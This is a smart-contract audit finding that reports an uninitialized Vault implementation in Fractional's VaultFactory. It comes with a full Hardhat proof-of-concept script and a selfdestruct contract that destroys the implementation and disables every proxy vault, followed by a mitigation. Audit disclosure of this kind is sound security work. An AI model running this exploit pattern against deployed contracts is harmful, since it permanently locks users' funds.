## Tags

- bug
- 3 (High Risk)
- sponsor confirmed

# [Vault implementation can be destroyed leading to loss of all assets](https://github.com/code-423n4/2022-07-fractional-findings/issues/200) 

# Lines of code

https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultFactory.sol#L19-L22
https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L11-L25


# Vulnerability details


This is a basic uninitialized proxy bug, the `VaultFactory` creates a single implementation of `Vault` and then creates a proxy to that implementation every time a new vault needs to be deployed.

The problem is that that implementation vault is not initialized , which means that anybody can initialize the contract to become the owner, and then destroy it by doing a delegate call (via the `execute` function) to a function with the `selfdestruct` opcode.
Once the implementation is destroyed all of the vaults will be unusable. And since there's no logic in the proxies to update the implementation - that means this is permanent (i.e. there's no way to call any function on any vault anymore, they're simply dead).

## Impact
This is a critical bug, since ALL assets held by ALL vaults will be lost. There's no way to transfer them out and there's no way to run any function on any vault.

Also, there's no way to fix the current deployed contracts (modules and registry), since they all depend on the factory vault, and there's no way to update them to a different factory. That means Fractional would have to deploy a new set of contracts after fixing the bug (this is a relatively small issue though).

## Proof of Concept

I created the PoC based on the `scripts/deploy.js` file, here's a stripped-down version of that:

```javascript
const { ethers } = require("hardhat");

const ZERO_ADDRESS = "0x0000000000000000000000000000000000000000";

async function main() {
    const [deployer, attacker] = await ethers.getSigners();

    // Get all contract factories
    const BaseVault = await ethers.getContractFactory("BaseVault");
    const Supply = await ethers.getContractFactory("Supply");
    const VaultRegistry = await ethers.getContractFactory("VaultRegistry");

    // Deploy contracts

    const registry = await VaultRegistry.deploy();
    await registry.deployed();

    const supply = await Supply.deploy(registry.address);
    await supply.deployed();

    // notice that the `factory` var in the original `deploy.js` file is a different factory than the registry's
    const registryVaultFactory = await ethers.getContractAt("VaultFactory", await registry.factory());

    const implVaultAddress = await registryVaultFactory.implementation();
    const vaultImpl = await ethers.getContractAt("Vault", implVaultAddress);

    const baseVault = await BaseVault.deploy(registry.address, supply.address);
    await baseVault.deployed();
    // proxy vault - the vault that's used by the user
    let proxyVault = await deployVault(baseVault, registry, attacker);

    const destructorFactory = await ethers.getContractFactory("Destructor");
    const destructor = await destructorFactory.deploy();


    let destructData = destructor.interface.encodeFunctionData("destruct", [attacker.address]);

    const abi = new ethers.utils.AbiCoder();
    const leafData = abi.encode(["address", "address", "bytes4"],
        [attacker.address, destructor.address, destructor.interface.getSighash("destruct")]);
    const leafHash = ethers.utils.keccak256(leafData);

    await vaultImpl.connect(attacker).init();

    await vaultImpl.connect(attacker).setMerkleRoot(leafHash);
    // we don't really need to do this ownership-transfer, because the contract is still usable till the end of the tx, but I'm doing it just in case
    await vaultImpl.connect(attacker).transferOwnership(ZERO_ADDRESS);

    // before: everything is fine
    let implVaultCode = await ethers.provider.getCode(implVaultAddress);
    console.log("Impl Vault code size before:", implVaultCode.length - 2); // -2 for the 0x prefix
    let owner = await proxyVault.owner();
    console.log("Proxy Vault works fine, owner is: ", owner);


    await vaultImpl.connect(attacker).execute(destructor.address, destructData, []);


    // after: vault implementation is destructed
    implVaultCode = await ethers.provider.getCode(implVaultAddress);
    console.log("\nVault code size after:", implVaultCode.length - 2); // -2 for the 0x prefix

    try {
        owner = await proxyVault.owner();
    } catch (e) {
        console.log("Proxy Vault isn't working anymore.", e.toString().substring(0, 300));
    }
}

async function deployVault(baseVault, registry, attacker) {
    const nodes = await baseVault.getLeafNodes();

    const tx = await registry.connect(attacker).create(nodes[0], [], []);
    const receipt = await tx.wait();

    const vaultEvent = receipt.events.find(e => e.address == registry.address);

    const newVaultAddress = vaultEvent.args._vault;
    const newVault = await ethers.getContractAt("Vault", newVaultAddress);
    return newVault;
}


if (require.main === module) {
    main()
}
```

`Destructor.sol` file:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

contract Destructor{
    function destruct(address payable dst) public {
        selfdestruct(dst);
    }
}
```

Output:
```
Impl Vault code size before: 10386
Proxy Vault works fine, owner is:  0x5FbDB2315678afecb367f032d93F642f64180aa3

Vault code size after: 0
Proxy Vault isn't working anymore. Error: call revert exception [ See: https://links.ethers.org/v5-errors-CALL_EXCEPTION ] (method="owner()", data="0x", errorArgs=null, errorName=null, errorSignature=null, reason=null, code=CALL_EXCEPTION, version=abi/5.6.2)
```

Sidenote: as the comment in the code says, we don't really need to transfer the ownership to the zero address.
It's just that Foundry's `forge` did revert the destruction when I didn't do it, with the error of `OwnerChanged` (i.e. once the `selfdestruct` was called the owner became the zero address, which is different than the original owner) so I decided to add this just in case.
This is probably a bug in `forge`, since the contract shouldn't destruct till the end of the tx (Hardhat indeed didn't revert the destruction even when the attacker was the owner).

## Tools Used
Hardhat

## Recommended Mitigation Steps



Add init in `Vault`'s constructor (and make the `init` function `public` instead of `external`):

```solidity
contract Vault is IVault, NFTReceiver {
    /// @notice Address of vault owner
    address public owner;
    /// ...

    constructor(){
        // initialize implementation
        init();
    }

    /// @dev Initializes nonce and proxy owner
    function init() public {

```

Alternately you can add init in `VaultFactory.sol` constructor, but I think initializing in the contract itself is a better practice.

```solidity
    /// @notice Initializes implementation contract
    constructor() {
        implementation = address(new Vault());
        Vault(implementation).init();
    }

```



After mitigation the PoC will output this:

```
Error: VM Exception while processing transaction: reverted with custom error 'Initialized("0xa16E02E87b7454126E5E10d957A927A7F5B5d2be", "0x70997970C51812dc3A010C7d01b50e0d17dc79C8", 1)'
    at Vault._execute (src/Vault.sol:124)
    at Vault.init (src/Vault.sol:24)
    at HardhatNode._mineBlockWithPendingTxs
    ....
```

